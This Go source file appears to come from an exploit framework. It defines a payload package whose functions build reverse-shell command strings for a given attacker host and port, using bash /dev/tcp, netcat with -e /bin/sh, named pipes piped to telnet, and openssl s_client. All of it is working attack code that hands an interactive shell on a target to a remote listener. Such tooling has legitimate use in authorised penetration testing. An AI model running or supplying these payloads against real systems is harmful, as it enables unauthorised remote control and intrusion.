package payload

import (
	"fmt"

	"github.com/vulncheck-oss/go-exploit/random"
)

func ReverseShellBash(lhost string, lport int) string {
	return fmt.Sprintf("bash -c 'bash &> /dev/tcp/%s/%d <&1'", lhost, lport)
}

func ReverseShellNetcatGaping(lhost string, lport int) string {
	// busybox nc expects the command to end with the -e option (when in use)
	return fmt.Sprintf("nc %s %d -e /bin/sh", lhost, lport)
}

func ReverseShellMknodTelnet(lhost string, lport int, colon bool) string {
	node := random.RandLetters(3)

	if colon {
		return fmt.Sprintf(`cd /tmp; mknod %s p; sh -i < %s 2>&1 | telnet %s:%d > %s; rm %s;`, node, node, lhost, lport, node, node)
	}

	return fmt.Sprintf(`cd /tmp; mknod %s p; sh -i < %s 2>&1 | telnet %s %d > %s; rm %s;`, node, node, lhost, lport, node, node)
}

func ReverseShellMkfifoTelnet(lhost string, lport int, colon bool) string {
	fifo := random.RandLetters(3)

	if colon {
		return fmt.Sprintf(`cd /tmp; mkfifo %s; telnet %s:%d 0<%s | sh 1>%s; rm %s;`, fifo, lhost, lport, fifo, fifo, fifo)
	}

	return fmt.Sprintf(`cd /tmp; mkfifo %s; telnet %s %d 0<%s | sh 1>%s; rm %s;`, fifo, lhost, lport, fifo, fifo, fifo)
}

func ReverseShellMknodOpenSSL(lhost string, lport int) string {
	node := random.RandLetters(3)

	return fmt.Sprintf(`cd /tmp; mknod %s p; sh -i < %s 2>&1 | openssl s_client -quiet -connect %s:%d > %s; rm %s;`, node, node,
		lhost, lport, node, node)
}
